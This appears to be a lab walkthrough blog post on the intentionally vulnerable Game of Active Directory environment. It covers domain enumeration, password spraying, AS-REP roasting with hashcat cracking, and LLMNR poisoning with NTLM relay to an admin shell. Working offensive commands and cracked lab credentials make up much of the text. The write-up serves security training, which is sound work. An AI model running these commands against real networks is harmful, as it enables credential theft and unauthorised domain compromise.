---
title: "GOAD Part 1: AD Recon, Password Spraying , ASREPRoasting & LLMNR Poisoning "
author: "Trevor Saudi"
date: 2024-06-21
description: ""
draft: false
subtitle: ""
tags:
- Active Directory
- Pentesting
---

<style>



@import url('https://cdn.rawgit.com/lonekorean/gist-syntax-themes/d49b91b3/stylesheets/one-dark.css');

@import url('https://fonts.googleapis.com/css?family=Open+Sans');


   
  *, ::before, ::after {
    border-style: none;
    font: 16px;

  }

  body {
  margin: 20px;
  font: 16px 'Open Sans', sans-serif;
}

.center { 
       display:inline-block; 
       margin-left: 60px; 
       margin-top: -20px;
}

</style>

![image](/posts/2024-06-21_red_team07/images/logo.png)



## Introduction

- <a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">Game of Active Directory</a> is a fully functional AD lab environment, misconfigured with several AD issues designed to help understand various AD security concepts. 
- In this n-part series, we will explore how we can abuse the misconfigurations. In part 1, we focus on `enumerating` the environment to find `domains, domain controllers, usernames and groups`. We further leverage this to conduct various attacks, showcasing techniques like `password spraying & ASREPRoasting`.
- We then finish off by exploring what attacks can be carried out when we have `no credentials or usernames` to work with such as the `LLMNR Poisoning and NTLM relay`.

## Network Diagram

<div>
        <img src="/posts/2024-06-11_red_team06/images/GOAD_schema.png" alt="no image" />
</div>

## Reconnaissance and Enumeration

- From our network diagram, we are dealing with 5 different machines across 3 domains in the network. 
1. `north.sevenkingdoms.local`
    - DC01 (kingslanding)
2. `sevenkingdoms.local`
    - DC02 (winterfell)
    - SRV02 (castleback)
3. `essos.local`
    - DC02 (mereen)
    - SRV03 (braavos)
- The creators of GOAD - Orange Cyberdefense - have also come up with <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank">this</a> mindmap that structures our AD pentesting approach. We will frequently refer to this resource when exploring the lab

### Hosts file setup

- We can begin by mapping out all the machines in our hosts file. Using the IP information and domains given to us, we can find the `domain controllers` in the network.

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.11
Server:         192.168.56.11
Address:        192.168.56.11#53

_ldap._tcp.dc._msdcs.north.sevenkingdoms.local  service = 0 100 389 winterfell.north.sevenkingdoms.local.

```
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10 
Server:         192.168.56.10
Address:        192.168.56.10#53

_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local.

```

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.essos.local 192.168.56.12
Server:         192.168.56.12
Address:        192.168.56.12#53

_ldap._tcp.dc._msdcs.essos.local        service = 0 100 389 meereen.essos.local.
```


- Our hosts file will look as shown:


```bash
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12   essos.local meereen.essos.local meereen
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
192.168.56.23   braavos.essos.local braavos
```

### Domain User enumeration

- We have several options for this. We will use `crackmapexec and enum4linux` to check for this information.

<div >
        <img src="/posts/2024-06-21_red_team07/images/find-user-list.png" alt="no image" />
</div>

```powershell
crackmapexec smb 192.168.56.10-23 --users 
```

<div >
        <img src="/posts/2024-06-21_red_team07/images/users-enum.png" alt="no image" />
</div>

- We get some domain users from the winterfell DC (the DC allows anonymous sessions) and credentials in a user's description. 

| Hostname     | Username                                  |
|--------------|-------------------------------------------|
| WINTERFELL   | north.sevenkingdoms.local\Guest           |
| WINTERFELL   | north.sevenkingdoms.local\arya.stark      |
| WINTERFELL   | north.sevenkingdoms.local\sansa.stark     |
| WINTERFELL   | north.sevenkingdoms.local\brandon.stark   |
| WINTERFELL   | north.sevenkingdoms.local\rickon.stark    |
| WINTERFELL   | north.sevenkingdoms.local\hodor           |
| WINTERFELL   | north.sevenkingdoms.local\jon.snow        |
| WINTERFELL   | north.sevenkingdoms.local\samwell.tarly   |
| WINTERFELL   | north.sevenkingdoms.local\jeor.mormont    |
| WINTERFELL   | north.sevenkingdoms.local\sql_svc         |

{{< alert "circle-info" >}}
samwell.tarly : Heartsbane 
{{< /alert >}}

<br>

- Recon is a recursive process. Upon getting valid credentials, you should rerun your user enumeration commands with credentials to see whether you get more information
```bash
crackmapexec smb ips.txt -u samwell.tarly -p Heartsbane 
```

<div>
        <img src="/posts/2024-06-21_red_team07/images/users-enum2.png" alt="no image" />
</div>

- We get more users on the domain. 

<div>
        <img src="/posts/2024-06-21_red_team07/images/users-enum2.png" alt="no image" />
</div>


### Domain Group enumeration

- I ran crackmapexec without creds but did don't get an output on any domain


- We can run either `crackmapexec` or `enum4linux` with  samwell's creds and extract some domain group information. We will only able to retrieve information on the `north` domain.

```bash
enum4linux -a -U 192.168.56.11  -u samwell.tarly -p Heartsbane
```
<div>
        <img src="/posts/2024-06-21_red_team07/images/group-enum.png" alt="no image" />
</div>

- We can map them out as shown:

| Group                         | RID  | Members                                                                                               |
|-------------------------------|------|-------------------------------------------------------------------------------------------------------|
| Mormont                       | 1108 | NORTH\jeor.mormont                                                                                    |
| Night Watch                   | 1107 | NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont                                               |
| Domain Guests                 | 514  | NORTH\Guest                                                                                           |
| Group Policy Creator Owners   | 520  | NORTH\Administrator                                                                                   |
| Domain Computers              | 515  | NORTH\CASTELBLACK$                                                                                    |
| Stark                         | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow |
| Domain Users                  | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |

## Valid Usernames

- With valid usernames for the `north` domain, we can attempt a `password spray` to hunt for `valid credentials` or perform an `ASREPRoast` using the valid credentials we obtained

<div>
        <img src="/posts/2024-06-21_red_team07/images/username-nocreds.png" alt="no image" />
</div>

### Password Spraying

- In this attack, we aim to identify valid user credentials by attempting few `commonly used passwords`. In organizations with a fairly high number of users, there's a chance that some are using weak passwords. 
- This attack contrasts with a standard brute-force that involves attempting many passwords against a single account which we cannot launch against this environment due to the account lockout policy shown below.

- `enum4linux` scan results:

<div>
        <img src="/posts/2024-06-21_red_team07/images/password-info.png" alt="no image" />
</div>


- We can use `crackmapexec's --no-bruteforce` parameter to achieve the password spray. I created a list of the user accounts and proceeded to use that list for the password list as well.

```c
crackmapexec smb 192.168.56.11 -u actualusers.txt -p actualusers.txt --no-bruteforce
```


<div>
        <img src="/posts/2024-06-21_red_team07/images/hodor.png" alt="no image" />
</div>

- We get `hodor's` credentials

{{< alert "circle-info" >}}
hodor : hodor

{{< /alert >}}

### AS-REPRoasting

- The authentication process for kerberos can be split into the following parts.

<div>
        <img src="/posts/2024-06-21_red_team07/images/asrep.jpg" alt="no image" />
</div>

- `AS-REPRoasting` allows attackers to extract Ticket Granting Tickets (TGT) for accounts that don't have Kerberos `pre-authentication` enabled. Attackers can request an Authentication Service Response (AS-REP) from the KDC without knowing the user's password. This response contains credential material that can be cracked offline.
- `Pre-authentication` ensures users send encrypted requests to the KDC when authenticating to services. When disabled, users send plain text requests and receive an encrypted AS-REP, making them vulnerable to offline cracking.

- We need valid user credentials (low privileged accounts work) to identify the target accounts. Using `samwell.tarly's` creds and `impacket-GetNPUsers`, we can enumerate the users

```powershell
impacket-GetNPUsers north.sevenkingdoms.local/samwell.tarly:Heartsbane -request
```
<div>
        <img src="/posts/2024-06-21_red_team07/images/as-rep.png" alt="no image" />
</div>

- Proceed to crack the credentials with hashcat.

```powershell
hashcat -m 18200 -a 0 brandon.hash /usr/share/wordlists/rockyou.txt.gz 
```
<div>
        <img src="/posts/2024-06-21_red_team07/images/cracked.png" alt="no image" />
</div>

{{< alert "circle-info" >}}
brandon.stark : iseedeadpeople
{{< /alert >}}

## No Valid Credentials/Usernames

- Lastly we will look at LLMNR Poisoning. In the event that you do not find any valid credentials or usernames, this is an essential step to take.

### LLMNR Poisoning

<div>
        <img src="/posts/2024-06-21_red_team07/images/poisoning.png" alt="no image" />
</div>

- LLMNR (Link-Local Multicast Resolution), is a protocol in Windows used to resolve NetBIOS names of computers on the same subnet when DNS resolution fails. When attempting to locate unknown resources in a network, LLMNR multicasts requests across a network to attempt to find unknown routes e.g shares.

- Attackers can trick devices to sending sensitive information by pretending to be the resource that another computer is trying to locate. 

#### 1. Listen and capture hashes

```powershell
sudo responder -I eth1
```

- We eventually harvest 2 user's credentials in the network

<div>
        <img src="/posts/2024-06-21_red_team07/images/robb.stark.png" alt="no image" />
</div>


<div>
        <img src="/posts/2024-06-21_red_team07/images/eddard.stark.png" alt="no image" />
</div>

#### 2. Crack with hashcat

```powershell
hashcat -m 5600 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt.gz 
```

- We get `robb.stark's` hash. 
 
{{< alert "circle-info" >}}
robb.stark : sexywolfy
{{< /alert >}}

- `edd's` hash could not be cracked but, we can relay the hashes to machines where `SMB signing` is disabled. SMB signing prevents relay attacks by appending a digital signature on packets for integrity checks.


#### 3. Find targets for relaying

- We can use crackmapexec to find the target where SMB signing has been disabled.

```powershell
crackmapexec smb 192.168.56.10-23 --gen-relay-list relay-targets.txt
```

<div>
        <img src="/posts/2024-06-21_red_team07/images/relay-list.png" alt="no image" />
</div>

- Castleback and Braavos domain controllers are vulnerable. For the attack to work, the user whose hashes being relayed has to be a local admin on the target.

- Disable SMB and HTTP Servers on responder to allow ntlmrelayx to relay the hashes instead of authenticating to itself. In Kali, the path is in the following folder

```powershell
vi /etc/responder/Responder.conf
```

<div>
        <img src="/posts/2024-06-21_red_team07/images/responder-options.png" alt="no image" />
</div>

- Start ntlmrelayx 

```powershell
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks  
```

<div>
        <img src="/posts/2024-06-21_red_team07/images/start-ntlmrelayx.png" alt="no image" />
</div>

- Start responder as well


```powershell
sudo responder -I eth1
```

- After a while we see this output where `eddard.stark` is able to authenticate to the `mereen` and `braavos` server.

<div>
        <img src="/posts/2024-06-21_red_team07/images/edd-auth.png" alt="no image" />
</div>

- If we type the command `socks`, we can also see the admin status of our connection to the machines

<div>
        <img src="/posts/2024-06-21_red_team07/images/socks.png" alt="no image" />
</div>

- We can authenticate as edd on the `192.168.56.22` machine `castleback` using `impacket-smbexec`. We can see edd.stark is a domain admin on the north domain

```powershell
proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```
<div>
        <img src="/posts/2024-06-21_red_team07/images/eedd.stark.png" alt="no image" />
</div>

- In part 2, we will work with Bloodhound and see how to hunt for various misconfigurations with our access in the domains.

## Appendix

### Valid Credentials

| Username         | Password          |
|------------------|-------------------|
| samwell.tarly    | Heartsbane        |
| hodor            | hodor             |
| brandon.stark    | iseedeadpeople    |
| robb.stark       | sexywolfy         |


### Valid Users


| Group                         | RID  | Members                                                                                               |
|-------------------------------|------|-------------------------------------------------------------------------------------------------------|
| Mormont                       | 1108 | NORTH\jeor.mormont                                                                                    |
| Night Watch                   | 1107 | NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont                                               |
| Domain Guests                 | 514  | NORTH\Guest                                                                                           |
| Group Policy Creator Owners   | 520  | NORTH\Administrator                                                                                   |
| Domain Computers              | 515  | NORTH\CASTELBLACK$                                                                                    |
| Stark                         | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow |
| Domain Users                  | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |